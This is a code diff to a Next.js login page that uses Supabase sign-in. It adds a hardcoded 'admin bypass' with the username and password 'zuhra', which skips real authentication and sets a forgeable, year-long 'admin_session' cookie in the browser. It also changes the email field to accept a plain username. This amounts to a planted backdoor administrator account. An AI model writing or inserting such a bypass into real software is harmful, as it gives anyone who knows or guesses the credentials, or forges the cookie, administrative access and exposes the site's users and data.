@@ -17,6 +17,14 @@ export default function LoginPage() {
     setLoading(true);
     setError("");
 
+    // Admin bypass: username "zuhra" with password "zuhra"
+    if (email === "zuhra" && password === "zuhra") {
+      document.cookie = "admin_session=zuhra_admin_authenticated; path=/; max-age=31536000; SameSite=Lax";
+      router.push("/overview");
+      router.refresh();
+      return;
+    }
+
     try {
       const supabase = createSupabaseClient();
       const { error } = await supabase.auth.signInWithPassword({
@@ -55,11 +63,11 @@ export default function LoginPage() {
 
         <div>
           <label htmlFor="email" className="block text-sm font-medium text-gray-700">
-            Email
+            Username or Email
           </label>
           <input
             id="email"
-            type="email"
+            type="text"
             required
             value={email}
             onChange={(e) => setEmail(e.target.value)}
